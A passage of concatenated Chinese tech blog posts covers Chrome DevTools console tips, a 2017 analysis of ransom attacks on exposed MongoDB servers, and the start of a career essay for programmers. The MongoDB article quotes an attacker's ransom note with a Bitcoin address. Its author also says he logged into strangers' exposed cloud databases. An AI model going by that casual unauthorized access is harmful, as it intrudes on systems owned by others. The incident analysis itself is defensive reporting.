有些HTML的DOM是有状态的，比如<a> 标签，其会有 active，hover， focus，visited这些状态，有时候，我们的CSS会来定关不同状态的样式，在分析网页查看网页上DOM的CSS样式时，我们可以点击CSS样式上的 **`:hov`** 这个小按钮来强制这个DOM的状态。

 

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjMzMSIgd2lkdGg9Ijg1MyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

 

#### 动画

现在的网页上都会有一些动画效果。在Chrome的开发者工具中，通过右上角的菜单中的 `More Tools` => `Animations` 呼出相关的选项卡。于是你就可以慢动作播放动画了（可以点选 `25%` 或 `10%`），然后，Chrome还可以帮你把动画录下来，你可以拉动动再画的过程，甚至可以做一些简单的修改。

 

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjcyMyIgd2lkdGg9IjQ0MiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

#### 直接编辑网页

在你的 console 里 输入下面的命令：

```
document.designMode = "on"
```

于是你就可以直接修改网页上的内容了。

P.S. 下面这个抓屏中还演示了一个如何清空console的示例。你可以输入 clear() 或是 按 `Ctrl+L`（Windows下），`CMD + K` (Mac下)

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjMyOCIgd2lkdGg9IjgwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

 

#### 网络限速

你可以设置你的网络的访问速度来模拟一个网络很慢的情况。

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjMxOSIgd2lkdGg9IjcwNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

 

#### 复制HTTP请求

这个是我很喜欢 的一个功能，你可以在 network选项卡里，点击 XHR 过滤相关的Ajax请求，然后在相关的请求上点鼠标右键，在菜单中选择： `Copy` => `Copy as cURL`，然后就可以到你的命令行下去 执行 `curl` 的命令了。这个可以很容易做一些自动化的测试。

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjMyOCIgd2lkdGg9IjgwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

 

**友情提示：这个操作有可能会把你的个人隐私信息复制出去，比如你个人登录后的cookie。**

#### 抓个带手机的图

这个可能有点无聊了，不过我觉得挺有意思的。

在device显示中，先选择一个手机，然后在右上角选 `Show Device Frame`，然后你就看到手机的样子了，然后再到那个菜中中选 Capture snapshot，就可以抓下一个有手机样子的截图了。

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjQwNCIgd2lkdGg9IjcwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

我抓的图如下（当然，不是所有的手机都有frame的）

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjMwMCIgd2lkdGg9IjE0OCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

 

#### 设置断点

除了给Javascript的源代码上设置断点调试，你还可以：

##### 给DOM设置断点

选中一个DOM，然后在右键菜单中选 Break on … 你可以看到如下三个选项：

#### ![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjM0NSIgd2lkdGg9IjUwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

##### 给XHR和Event Lisener设置断点

在 Sources 面页中，你可以看到右边的那堆break points中，除了上面我们说的给DOM设置断点，你还可以给XHR和Event Listener设置断点，载图如下：

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjQ5MSIgd2lkdGg9IjQwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

#### 关于Console中的技巧

##### DOM操作

- chrome会帮你buffer 5个你查看过的DOM对象，你可以直接在Console中用 $0, $1, $2, $3, $4来访问。

- 你还可以使用像jQuery那样的语法来获得DOM对象，如：`$("#mydiv")`

- 你还可使用 `$$(".class")` 来选择所有满足条件的DOM对象。

- 你可以使用 `getEventListeners($("selector"))` 来查看某个DOM对象上的事件（如下图所示）。

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjIyMyIgd2lkdGg9IjY0MiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

- 你还可以使用 `monitorEvents($("selector"))` 来监控相关的事件。比如：

```
monitorEvents(document.body, "click");
```

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjIzNiIgd2lkdGg9IjY0MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

##### Console中的一些函数

**1）monitor函数**

使用 monitor函数来监控一函数，如下面的示例

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjExMiIgd2lkdGg9IjMwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

**2）copy函数**

copy函数可以把一个变量的值copy到剪贴板上。

**3）inspect函数**

inspect函数可以让你控制台跳到你需要查看的对象上。如：

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjI4NyIgd2lkdGg9IjY0MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

更多的函数请参数官方文档 – [Using the Console / Command Line Reference](https://developers.google.com/web/tools/chrome-devtools/console/command-line-reference)

##### Console的输出

我们知道，除了`console.log`之外，还有`console.debug`，`console.info`，`console.warn`，`console.error`这些不同级别的输出。另外一个鲜为人知的功能是，`console.log`中，你还可以对输出的文本加上css的样式，如下所示：

```
console.log("%c左耳朵", "font-size:90px;color:#888")
```

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjkyIiB3aWR0aD0iMzAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZlcnNpb249IjEuMSIvPg==)

于是，你可以定义一些相关的log函数，如：

```
console.todo = function( msg){
  console.log( '%c%s %s %s', 'font-size:20px; color:yellow; background-color: blue;', '--', msg, '--');
}
console.important = function( msg){
  console.log( '%c%s %s %s', 'font-size:20px; color:brown; font-weight: bold; text-decoration: underline;', '--', msg, '--');
}
```

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjIwMSIgd2lkdGg9IjUwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

关于console.log中的格式化，你可以参看如下表格：

| 指示符   | 输出                           |
| -------- | ------------------------------ |
| %s       | 格式化输出一个字符串变量。     |
| %i or %d | 格式化输出一个整型变量的值。   |
| %f       | 格式化输出一个浮点数变量的值。 |
| %o       | 格式化输出一个DOM对象。        |
| %O       | 格式化输出一个Javascript对象。 |
| %c       | 为后面的字符串加上CSS样式      |

 

除了console.log打印js的数组，你还可以使用console.table来打印，如下所示：

```
var pets = [
  { animal: 'Horse', name: 'Pony', age: 23 },
  { animal: 'Dog', name: 'Snoopy', age: 13 },
  { animal: 'Cat', name: 'Tom', age: 18 },
  { animal: 'Mouse', name: 'Jerry', age: 12}
];
console.table(pets)
```

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjIxNCIgd2lkdGg9IjUwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

 

#### 关于console对象

- console对象除了上面的打日志的功能，其还有很多功能，比如：
- console.trace() 可以打出js的函数调用栈
- console.time() 和 console.timeEnd() 可以帮你计算一段代码间消耗的时间。
- console.profile() 和 console.profileEnd() 可以让你查看CPU的消耗。
- console.count() 可以让你看到相同的日志当前被打印的次数。
- console.assert(expression, object) 可以让你assert一个表达式

这些东西都可以看看[Google的Console API的文档](https://developers.google.com/web/tools/chrome-devtools/console/console-reference)。

其实，还有很多东西，你可以参看Google的官方文档 – [Chrome DevTools](https://developers.google.com/web/tools/chrome-devtools/)

#### 关于快捷键

点击在 DevTools的右上角的那三个坚排的小点，你会看到一个菜单，点选 `Shortcuts`，你就可以看到所有的快捷键了

![img](data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjI5MSIgd2lkdGg9IjY0MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2ZXJzaW9uPSIxLjEiLz4=)

如果你知道更多，也欢迎补充！

（全文完）

# 从 MONGODB “赎金事件” 看安全问题

#####  [2017年01月07日 ](https://coolshell.cn/articles/17607.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [44 条评论](https://coolshell.cn/articles/17607.html#comments) 80,705 人阅读

![img](photo/MongoDB-360x200.jpg)今天上午（2017年1月7日），我的微信群中同时出现了两个MongoDB被黑掉要赎金的情况，于是在调查过程中，发现了这个事件。这个事件应该是2017年开年的第一次比较大的安全事件吧，发现国内居然没有什么报道，国内安全圈也没有什么动静（当然，他们也许知道，只是不想说吧），Anyway，让我这个非安全领域的人来帮补补位。

#### 事件回顾

这个事情应该是从2017年1月3日进入公众视野的，是由安全圈的大拿 Victor Gevers （网名：[0xDUDE](https://twitter.com/0xDUDE)，[GDI.foundation](http://gdi.foundation/) 的Chairman），其实，他早在2016年12月27日就发现了一些在互联网上用户的MongoDB没有任何的保护措施，被攻击者把数据库删除了，并留下了一个叫 WARNING 的数据库，这张表的内容如下：

```sql
{
    "_id" : ObjectId("5859a0370b8e49f123fcc7da"),
    "mail" : "harak1r1@sigaint.org",
    "note" : "SEND 0.2 BTC TO THIS ADDRESS 13zaxGVjj9MNc2jyvDRhLyYpkCh323MsMq AND CONTACT THIS EMAIL WITH YOUR IP OF YOUR SERVER TO RECOVER YOUR DATABASE !"
}
```

基本上如下所示：



![MongoDB ransom demand (via Victor Gevers)](photo/MongoDB-ransom.png)MongoDB ransom demand (via Victor Gevers)

说白了就是黑客留下的东西——**老子把你的MongoDB里的数据库给转走了，如果你要你的数据的话，给我0.2个的比特币（大约USD200）**。然后，他的twitter上不断地发布这个“赎金事件”的跟踪报道。与此同时，中国区的V2EX上也发现了相关的攻击问题 《[自己装的 mongo 没有设置密码结果被黑了](https://www.v2ex.com/t/331887)》

然后，在接下来的几天内，全球大约有1800个MongoDB的数据库被黑，这个行为来自一个叫 Harak1r1 的黑客组织（这个组织似乎就好黑MongoDB，据说他们历史上干了近8500个MongoDB的数据库，几乎都是在祼奔的MongoDB）。

不过，这个组织干了两天后就停手了，可能是因为这事已经引起了全球科技媒体的注意，产生了大量的报道（如果你在Google News里查一下“[mongodb ransom](https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=mongodb+ransom&newwindow=1&tbm=nws)”，你会看到大量的报道（中文社区中，只有[台湾有相关的报道](https://unwire.pro/2017/01/05/2000-mongodb-ransom/security/)）），他们也许是不敢再搞下去了。

不过，很快，有几个copycats开始接着干，

马上跟进的是 own3d ，他们留下的数据库的名字叫 WARNING_ALERT，他们至少干掉了 930个MongoDB，赎金0.5个比特币（USD500），至少有3个用户付费了

然后是0704341626asdf，他们留下的数据库名字叫PWNED，他们至少干掉了740个MongoDB，赎金0.15个比特币（USD150），看看他们在数据库里留下的文字——**你的MongoDB没有任何的认证，并且暴露在公网里（你TMD是怎么想的？）……**

![0704341626asdf group ransom note (via Victor Gerves)](photo/MongoDB-Group-3.jpg)0704341626asdf group ransom note (via Victor Gerves)

就在这两天，有两个新的黑客也来了

- 先是kraken0，发现到现在1天了，干了13个MongoDB，赎金 0.1个比特币。
- 然后是 3lix1r，发现到现在5个小时，干了17个MongoDB，赎金0.25比特币。

BBC新闻也于昨天报道了这一情况——《[Web databases hit in ransom attacks](https://www.bbc.com/news/technology-38521973)》，现在这个事情应该是一个Big News了。

#### 关于MongoDB的安全

安全问题从来都是需要多方面一起努力，但是安全问题最大的短板就是在用户这边。这次的这个事，说白了，就是用户没有给MongoDB设置上用户名和口令，然后还把服务公开到了公网上。

是的，这个安全事件，相当的匪夷所思，为什么这些用户要在公网上祼奔自己的数据库？他们的脑子是怎么想的？

让我们去看一下Shodan上可以看到的有多少个在暴露在公网上而且没有防范的MongoDB？我了个去！**4万7千个，还是很触目惊心的**（下图来自我刚刚创建的 [Shodan关于MongoDB的报表](https://www.shodan.io/report/h0bgF6zM)）

![img](photo/MongoDB_Shodan-1024x485.png)

 

那么，怎么会有这么多的对外暴露的MongoDB？看了一下Shodan的报告，发现主要还是来自公有云平台，Amazon，Alibaba，Digital Ocean，OVH，Azure 的云平台上有很多这样的服务。不过，像AWS这样的云平台，有很完善的默认安全组设置和VPC是可以不把这样的后端服务暴露到公有云上的，为什么还会有那么多？

![img](photo/MongoDB_Org.png)

 

这么大量的暴露在公网上的服务是怎么回事？有人发现（参看这篇文章《[It’s the Data, Stupid!](https://blog.shodan.io/its-the-data-stupid/)》 ），MongoDB历史上一直都是把侦听端口绑在所有的IP上的，这个问题在5年前（2011年11月）就报给了MongoDB ([SERVER-4216](https://jira.mongodb.org/browse/SERVER-4216))，结果2014年4月才解决掉。所以，他觉得可能似乎 MongoDB的 2.6之前的版本都会默认上侦听在0.0.0.0 。

于是我做了一个小试验，到我的Ubuntu 14.04上去 `apt-get install mongodb`（2.4.9版），然后我在`/etc/mongodb.conf` 文件中，看到了默认的配置是127.0.0.1，mongod启动也侦听在了127.0.0.1这台机器上。一切正常。不过，可能是时过境迁，debain的安装包里已加上了这个默认配置文件。不管怎么样，MongoDB似乎是有一些问题的。

再到Shodan上看到相关的在公网裸奔的MongoDB的版本如下，发现3.x的也是主流：

![img](photo/MongoDB_Version.png)

 

虽然，3.x的版本成为了主流，但是似乎，还是有很多人把MongoDB的服务开到了互联网上来，而且可以随意访问。

**你看，我在阿里云随便找了几台机器，一登就登上去了。**

![img](photo/MongoDB_Aliyun.png)

真是如那些黑客中的邮件所说的：WTF，你们是怎么想的？

#### 后续的反思

为什么还是有这么多的MongoDB在公网上祼奔呢？难道有这么多的用户都是小白？这个原因，是什么呢？我觉得可能会是如下两个原因：

1）一是技术人员下载了mongod的软包，一般来说，mongodb的压缩包只有binary文件 ，没有配置文件 ，所以直接解开后运行，结果就没有安全认证，也绑在了公网上。也许，MongoDB这么做的原因就是为了可以快速上手，不要在环境上花太多的时间，这个有助于软件方面的推广。但是，这样可能就坑了更多的人。

2）因为MongoDB是后端基础服务，所以，需要很多内部机器防问，按道理呢，应该绑定在内网IP上，但是呢，可能是技术人员不小心，绑在了0.0.0.0的IP上。

那么，这个问题在云平台上是否可以更好的解决呢？

**关于公网的IP。**一般来说，公有云平台上的虚拟主机都会有一个公网的IP地址，老实说，这并不是一个好的方法，因为有很多主机是不需要暴露到公网上的，所以，也就不需要使用公网IP，于是，就会出现弹性IP或虚拟路由器以及VPC这样的虚拟网络服务，这样用户在公有云就可以很容易的组网，也就没有必要每台机器都需要一个公网IP，使用云平台，最好还是使用组网方案比较好的平台。

**关于安全组**。在AWS上，你开一台EC2，会有一个非常严格的安全组——只暴露22端口，其它的全部对外网关闭。这样做，其实是可以帮用户防止一下不小心把不必要的服务Open到公网上。按道理来说，AWS上应该是帮用户防了这些的。但是，AWS上的MongoDB祼奔的机器数量是最多的，估计和AWS的EC2的 基数有关系吧（据说AWS有千万台左右的EC2了）

最后，提醒大家一下，被黑了也不要去付赎金，因为目前来说没有任何证据证明黑客们真正保存了你的数据，因为，被黑的服务器太多了，估计有几百T的数据，估计是不会为你保存的。下面也是Victor Gevers的提示：

![img](photo/MongoDB_Twitter.png)

（全文完）

# 技术人员的发展之路

#####  [2016年12月28日 ](https://coolshell.cn/articles/17583.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [192 条评论](https://coolshell.cn/articles/17583.html#comments) 307,955 人阅读

![img](photo/people-360x200.jpg)2012年的时候写过一篇叫《[程序算法与人生选择](https://coolshell.cn/articles/8790.html)》的文章，我用算法来类比如何做选择，说白了就是怎么去计算，但是并没有讲程序员可以发展的方向有哪些。 所以，就算是有这些所谓的方法论，我们可能对自己的发展还是会很纠结和无所事从，尤其是人到了30岁，这种彷徨和迷惑越来越重。虽然我之前也写过一篇《[编程年龄和编程技能](https://coolshell.cn/articles/10688.html)》的文章，但是还是有很多做技术的人对于自己能否在年纪大时还能去做技术感到没有信心。我猜测，这其中，最大的问题的是，目前从事技术工作的种种负面的经历（比如经常性的加班，被当成棋子或劳动力等等），让人完全看不到希望和前途，尤其是随着年纪越来越大，对未来的越来越没有信心。

同时，也是因为在GIAC的大会被问到，程序员老了怎么办？而在年底这段时间，也和几个朋友在交流中不断地重复谈到个人发展的这个话题。我的人生过半，活到“不惑”的年纪，自然经常性的对什么事都会回头看看总结归纳，所以，在交谈过程中和交谈过后，自己也有一些思考想记录下来。因为我本人也是在这条路上的人，所以，谈不上给他人指导，我同样也是在瞎乱折腾同样每天在思考自己要去哪儿的“一尘世间迷途老生”。况且，我的经历和眼界非常有限，因此，下面的这些关于个人发展的文字和思考必然是受我的眼界和经历所局限的。也欢迎大家补充和指正。

这些东西不一定对，也不一定就是全部，期许可以让你在年底的时候有所思考，在明年的时候有所计划。

目录



[一个重要阶段和标志](https://coolshell.cn/articles/17583.html#一个重要阶段和标志)[个人发展的三个方向](https://coolshell.cn/articles/17583.html#个人发展的三个方向)[一、在职场中发展](https://coolshell.cn/articles/17583.html#一、在职场中发展)[1、去顶尖公司](https://coolshell.cn/articles/17583.html#1、去顶尖公司)[2、去真正的创业公司](https://coolshell.cn/articles/17583.html#2、去真正的创业公司)[3、职业生涯的发展阶段](https://coolshell.cn/articles/17583.html#3、职业生涯的发展阶段)[二、追求人生的经历](https://coolshell.cn/articles/17583.html#二、追求人生的经历)[三、追求自由的生活](https://coolshell.cn/articles/17583.html#三、追求自由的生活)[总结](https://coolshell.cn/articles/17583.html#总结)

#### 一个重要阶段和标志

在讲个人发展之前，我需要先说一下人生中的一个非常重要的阶段——**20到30岁！**

**这个阶段的首要任务，就是提升自己学习能力和解决难题的能力。****这是一个非常非常关键的时间段！这个时间段几乎决定着你的未来。**



30岁以前，这个时间段，应该是人学习和积累的时间段，这个时间段，就是努力学习的时间段。这个时间段，你一定要把时间花在解决问题的技能上。就是说，你一定要练就成的技能是——你能解决大多数人不能解决的问题。使蛮力埋头加班苦干，当一个搬砖老黄牛的是肯定没有前途的。如果你不幸呆在了一个搬砖的地方，天天被业务压得喘不过气来，我建议你宁可让你的项目延期被老板骂，也要把时间挤出来努力学习基础知识，多掌握一些技术（很多技术在思路上是相通的），然后才能有机会改变自己目前的状况。因为，比起你的个人未来，项目延期被老板骂、绩效不好拿不到奖金，都不是什么事儿。

总结一下，你在30岁前，工作5-7年，你需要拥有：

- **高效的学习能力**。这意味着——基础知识扎实、触类旁通、读英文文档不费劲、有寻找前沿知识的能力、能够看到问题和技术的本质、善于思辩、能独立思考。

- **解决问题的能力**。这意味着——你要高效的学习能力、见过很多的场景、犯过或是处理很多错误、能够防火而不是救火。

如果你拥有这两个能力的现象是—— **在团队或身边的人群中的显现出Leadership**。

Leadership并不是当领导和经理，而是一种特征，这种特征有如下两个简单的表象：

- **帮人解问题**。团队或身边中大多数人都在问：“这问题怎么办？”，而总是你能站出来告诉大家这事该怎么办？

- **被人所依赖**。团队或身边中大多数人在做比较关键的决定时，都会来找你咨询你的意见和想法。

一但你在在30岁之间出现了Leadership这样的特征，那么，你会进入一个正循环的阶段：

- 因为你学习能力强，所以，你会有更多的机会解决难题。
- 你有更多的机会解决难题，你就会学更多的东西，于是你就会更强。
- 上面这个循环，只要循环上几年，就会让你人生的各种可能性大大的增加。

**【 注意 】**

- 要达到这样的特质，需要找到自己的长处、以及适合自己的环境。就像鱼的特长是呆在水里，让鱼儿去追求陆上动物的刺激生活并不靠谱。

- 一般说来，有这样的潜质的人，在学校中就应该要出现。如果你在大学中还没有出现这样的潜质，那么，你在工作当中要加倍努力了（注：所谓的加倍努力，不是让你使蛮力加班，而是让你多学习成长，使蛮力拼命是弥补不了能力、思维、眼界上的缺陷的）。

- Leadership也有范围的，比如，身边的朋友，工作中的团队/部分，圈内，整个行业。Leadership的范围越大，你的个人发展的选择性就越高。反之则越小。

- 如果已到了30岁左右，还是没有出现这样的特征。那么，可能未来你也很难有这样的Leadership了。而你的个人发展的可能性可能也就不多了（sigh…）

**读到这里，我必需要说一下，如果你已开始显现出你的Leadership，那么你才谈得上个人发展，这篇文章后续的内容也可能才会对你有意义**。

#### 个人发展的三个方向

以我个人短浅的经历和视野，目前只看到的人的发展有如下三个大方向（他们之间可能会有重叠）：

1）**在职场中打拼**

2）**去经历有意义有价值的事**

3）**追求一种自由的生活**

这三个方向，我个人或多或少都体验过，我也见过身边的很多人走这三个方向走的比较成功。也许还有别的方向，没办法，现在，我的视野就这么大，所以，我在这里，我主要就是谈谈这三个方向。Again，**人有资格去走这三个方向的前提是——已有了上面我说的Leadership那种特质！**

#### 一、在职场中发展

在职场中发展应该是绝大多数人的选择。通过加入公司来达到人生的发展。

我们经常可以看到很多所谓的“职业规划”，但是大多数职业规划只不过人力资源搞出来的东西，和实际其实是有很大出入的。我的人生经历中，有18年左右是在公司中度过的，在过银行，小公司，大公司，民营公司，外国公司，传统IT公司，互联网公司，不同的公司完全有不同的玩法和文化，我的经历还算丰富，但也不算特别成功，这里只分享一些我在职场中的心得（不一定对，仅供参考）。

##### 1、去顶尖公司

**去顶尖公司的一个目的就是让你的Leadership的范围的可能性扩大**。

因为公司和公司的差距也不小，所以，就算你在低端公司里是骨干份子，但在高端公司里可能只是一个普通员工（就像中国足球队的主力到了英超可能都无法入选）。所以，在职场中，如果你要让你的个人价值最大化的话，你一定要去顶尖的公司。因为顶尖公司里有非常不错的工作方法和场景，这并不是能看书或是交流得来的，这是必需要去亲身体验的。所以说，在顶尖公司掌握的技能，开阔的眼界，通常来说都会比低端公司的要多得多。

另外，每个公司的工作级别都是有相互对标的，比如：阿里的P几对应于百度的T几。国内的一线公司职位还相当，但是如果和国外一线公司的比，那就有差距了，而且差距还很大。比如，Google或Facebook的某个高级工程师，可能就对应于阿里的P8/P9甚至更高。

是的，对于职场来说，如果你在顶尖公司是骨干，那么，你去低端公司，则有很大机会会成为他们高管和核心。就好像你在Facebook里干三五年成为他们的技术骨干，那么你到BAT去成成为高管概率是非常大的。反过来，如果你毕业主去了BAT成为了一个螺丝钉，在天天加班中度过你的青春，你干个十年能成为BAT的高管的概率可能会非常的低。

##### 2、去真正的创业公司

去顶尖公司和去创业公司在某些时候并不冲突。不过，这里我想讲的是，一个技术能力强的人在大公司可能会被埋没掉。因为大公司业务成功后，

- 成功的公司在招聘各种高级技术人才都不会成为问题，于是少你一个不少，多你一个不多。

- 成功的公司其整个技术体系已经完成，Legacy的问题也比较多，所以，可以供你发挥的余地不大。

- 成功的公司更多的可能会想要稳定的系统，稳定必然会产生保守，而保守则产生不思进取。

所以，对于中高级人才来说，在大公司里的能产生的个人价值，可能远远不如那些求贤若渴、没有包袱、可以尽情施展、相对更为灵活和自由的创业型公司。

不过，去创业公司需要小心仔细的挑选和评估，创业公司的不确定因素很多，也和创始人的因素太大了，所以，你需要小心了解创始人和他们的业务情况，想法和理念差不多才能更好的共事。

好多创业公司其实并不是真正的创业公司，他们创业有很大的侥幸和驱利心理，要小心甄别。因为那不是真正的创业公司。

##### 3、职业生涯的发展阶段

首先，有一个不争事实——**整个社会是会把最重要的工作交给30岁左右的这群人的。也就是说，30岁左右这群人是这个社会的做事的中坚力量。**

所以，这是一个机遇！如果你有了Leadership，你就一定能在这个时间段内赶得上这个机遇——公司和领导对你寄于信任和厚望，并把重要的团队和工作交给你。

于是，你的30岁到40岁就成了一个职业生涯的发展期，也就是你的事业上升期。如果你到40岁都没有赶上，那么你的职业生涯也就这样了，老有所成的人是少数。

在你事业的上升期，你需要更多的软技能，比如：

- 带领产品和业务的发展的能力
- 推行自己喜欢的文化的能力
- 项目管理的能力——在任务重、时间紧中求全
- 沟通和说服别人的能力
- 解决冲突的能力
- 管理和发展团队的能力
- 解决突发事件的应急能力
- …… ……

另外，你还要明白在职场里的几个冷酷的事实：

- **你开始要关心并处理复杂的人事**。尤其在大公司，大量的人都是屁股决定脑袋，利益关系复杂，目标不一致，每个人心里都有不一样的想法。这个时候再也不是talk is cheap, show me the code！而是，code is cheap，talk is the matter。你需要花大量的时间去思考和观察形形色色的人。需要耗费大量的精力在不同的人之间周旋，而不是花时间去创造些什么有价值的东西。

- **你要开始学会使用各种政治手段**。办公室政治不可避免，越大的公司越重，自从你开始成为一线的leader的那一天起，你就开始成为“里外不是人”的角色，需要在下属和领导，员工和公司之间周旋。随而你的级别越来越高，你需要使用更多的政治手段，你会学会审时度世的站队，学会迎合员工和领导，学会用官员的语言说话，学会此一时彼一时，学会妥协和交换，学会忍气吞声，学会在在适当的时机表现自己，学会波澜不惊，学会把自己隐藏起来，甚至你还会迷失自我，开始学会一些厚黑学，比如不得不在适当的时机在背后捅人刀子……你可能会成为一个你自己都讨厌的人

听上去真的好无聊，所以，你现在也明白为什么高层们都看上去很忙很累，而且抽不出时间来关心细节问题，因为，他们更多的是要协调整个组织和系统来运转，甚至还要四处周旋，各种博弈，没办法，这是职场的必需的东西！听起来是不是感觉人类很愚蠢？这真是没办法的事。如果你不想或是也没有能力玩这些东西，那么你需要去那些可以让技术人员安安心心做技术的公司。这类的公司，我见过Microsoft、Google、Amazon或是一些创业公司里都有。国内的大公司中也有让技术人员成长的职业成长线，但老实说，表面上看似是一个让人专心做技术的升职成长线，但其实还是管理岗位。

所以，**技术人员在职场中的归宿有两条路 —— 到真正的技术公司成为一个专心做技术的人，或是在成为一个职业的经理人**。

 

#### 二、追求人生的经历

先说三个故事，

- 第一个，是在阿里的时候，有一天在内网里看到一个贴子，一个做产品的女孩说自己准备离职要去法国学烘培厨艺，引得大家热评。

- 第二个，是在亚马逊的美国老板，他每年都要去报个培训班学一个技能，比如：厨艺、开双翼飞机、夜总会里的DJ……、甚至去华盛顿去学当一个政客。

- 第三个，是在汤森路透工作时，一个英国的同事，有一天他说他离职了，和自己的老婆准备用余生去周游世界，我问他是不是有足够多的钱了？他和我说，钱不够，他俩口子的计划是，边旅游边打工，打工打够到下一站的钱就走。他还说，那种用假期去另一个城市的旅游太没意思了，如果你不在那个地方生活上一段时间 ，你怎么能算是好的旅游体验呢？好吧，无法反驳。

我是觉得他们把自己的人生过得如此有意思，令我很佩服。虽然跨界跨得有点猛，但是 Why Not？

在这里，我想说，去追求一种和众人不一样的人生经历也是一件挺好的事，我个人感觉，比起在职场里有趣地多多了。如果你厌倦了职场，其实为什么不去追求一下不同的人生经历呢。就算你不想去追求跨度比较大的人生经历，那么，在技术圈里，也有很多有价值有意思的经历也可以去的。**追求刺激有意义的与众不同的经历的人，其实也能算是一种人生的成功，不是吗？**

如果只说技术方面，我个人看到的去追求经历的人，有两种追求的人其实也很成功的：

- **到技术创新的发源地去经历创新**。计算机互联网各种技术的创新引擎，基本上来说，就是在美国了。我们赶上了这个时代，也选对了这个时代最火热的行业，那么，有什么理由不去这个时代的技术发动机那里去经历呢？在美国硅谷湾区，无论是大公司，还是创业公司，都在迸发着各式各样的创新，如果有能力有机会，为什么不努力去经历一下呢？不经历一下，老了不会觉得错过了是一种后悔吗？

- **去经历下一个热点技术的发展**。从IT，到互联网、再到移动互联网、云计算、大数据，再到未来的AI，VR，IoT……，技术创新的浪潮一波接一波的过来，你是想在那继续搬砖搬下去，是想迎浪而上去经历浪潮，还是想成为一个随波逐流的人？

打工也好，创业也好，在国内也好，在国外也好，这些都是形式，不是内容。内容则是你有没有和有想法的人去经历有意义有价值事？人生苦短，白驹过隙，我们技术人员最大的幸运就是生在这样一个刺激的时代，那么，你还有什么理由不去追逐这些前沿刺激的经历呢？

#### 三、追求自由的生活

我相信“自由”这个事，是所有人的心中都会想去追求的。“生命诚可贵，爱情价更高，…… ”（哈哈）

但一说起自由，绝大多数人都想到的是“财富自由”或是“财务自由”，其实，并不完全是这样的，在自由的通路上，我个人的经历告诉我，其实，你会有很多的不同类型的自由。下面，是我对几个层次的“自由”的理解。

**第一层自由——工作自由**。人的第一层自由的境界是——“工作自由”，我到不是说你在工作单位上可以很自由，虽然有特例，但并不普遍。我想说的“工作自由”是——你不会有失业危机感了。也就是说，你成了各个公司的抢手货，你不但不愁找不到工作，而且你是完全不愁找不到好工作。试想一下，如果是工作来找你，一方面，你就有真正意义上的工作选择权了，另一方面，你都不愁工作了，你完全就可以随时离职去干你想干的事了。此时，你就达到了“工作自由”。

